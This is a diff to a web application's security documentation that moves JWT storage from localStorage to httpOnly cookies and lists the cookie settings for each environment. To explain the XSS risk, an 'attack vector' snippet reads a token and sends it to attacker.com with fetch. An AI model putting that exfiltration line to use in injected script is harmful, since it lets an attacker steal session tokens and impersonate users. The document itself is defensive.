@@ -144,45 +144,77 @@ CORS_ALLOWED_ORIGINS = ['*']
 
 ---
 
-## 5. JWT Token Security & Storage
+## 5. JWT Token Security & Storage (httpOnly Cookies)
 
-### Current Architecture
+### Production Architecture (CURRENT IMPLEMENTATION)
 ```
-User registers → Backend issues access_token (1 day) + refresh_token (7 days)
-→ Frontend stores in localStorage
-→ Every API call: Authorization: Bearer <access_token>
-→ On 401: Frontend auto-refreshes token using refresh_token
+User registers/logs in → Backend issues access_token (1 day) + refresh_token (7 days)
+→ Backend sets httpOnly cookies (browser-only, JS-inaccessible)
+→ Browser automatically includes cookies on every request
+→ On token expiry: Backend auto-refreshes via refresh endpoint
+→ On 401: Frontend redirects to login
 ```
 
-### Production Concerns
+### httpOnly Cookie Configuration
 
-#### Issue 1: localStorage is vulnerable to XSS
-**Current implementation:**
+This application uses **httpOnly cookies** for maximum security. Cookie settings are environment-aware:
+
+#### Development Mode (DEBUG=True)
+```bash
+DEBUG=True
+HTTPONLY_COOKIES_ENABLED=False  # Default in development
+```
+
+**Cookies are set with:**
+- `httponly=False` — Accessible to JavaScript for debugging
+- `secure=False` — Sent over HTTP (no HTTPS required)
+- `samesite=Lax` — CSRF protection for same-site requests
+- Cookie is readable in browser DevTools for troubleshooting
+
+#### Production Mode (DEBUG=False)
+```bash
+DEBUG=False
+HTTPONLY_COOKIES_ENABLED=True  # Default in production
+SECURE_COOKIE_ENABLED=True      # Requires HTTPS
+```
+
+**Cookies are set with:**
+- `httponly=True` — **NOT accessible to JavaScript** (XSS protection)
+- `secure=True` — Sent only over HTTPS (encrypted in transit)
+- `samesite=Strict` — Only sent on same-site requests (CSRF protection)
+- Cookie is **NOT readable** in browser DevTools (by design)
+
+### Why This Protects Against XSS
+
+**Attack Vector (localStorage):**
 ```javascript
-// frontend/js/auth.js
-localStorage.setItem('mm-access-token', tokens.access);
-localStorage.setItem('mm-refresh-token', tokens.refresh);
+// If attacker injects malicious JS:
+const token = localStorage.getItem('access_token');  // ✅ Attacker can read token
+fetch('https://attacker.com/steal?token=' + token);  // ✅ Can steal token
 ```
 
-**Why it's risky:**
-- If attacker injects malicious JS into your page, they can steal tokens
-- Stolen tokens can be used to impersonate the user
+**Defense (httpOnly Cookies):**
+```javascript
+// Even if attacker injects malicious JS:
+const token = document.cookie;  // ❌ Returns empty (httpOnly blocks access)
+const token = window.localStorage['access_token'];  // ❌ No token stored in localStorage
 
-**Solutions (for future phases):**
-1. **httpOnly Cookies** (recommended for production)
-   - Browser doesn't expose to JS, only sends with HTTP requests
-   - Can't be stolen by XSS (attacker can still perform actions, but can't copy tokens)
-   - Requires `CSRF` protection (we'd add it)
+// ✅ But attacker CAN still make requests:
+fetch('/api/transactions/');  // ✅ Cookies sent automatically by browser
+// However, they cannot STEAL or EXFILTRATE the token
+```
 
-2. **Secure Token Endpoint**
-   - Issue tokens to backend endpoint, not frontend
-   - Frontend never sees tokens, just receives "authenticated" response
-   - More complex, but maximum security
+### How to Override for Specific Environments
 
-**For now (Phase 2):**
-- Keep localStorage (acceptable for MVP)
-- Add CSRF protection before production
-- Use HTTPS (prevents token interception in transit)
+If you have an embedded/Electron browser that doesn't properly handle httpOnly cookies:
+
+```bash
+# Force httpOnly=False even in production
+DEBUG=False
+HTTPONLY_COOKIES_ENABLED=False  # Override setting
+```
+
+**Note:** This reduces security. Only use if absolutely necessary.
 
 #### Issue 2: Refresh Token Rotation
 **Current implementation:**
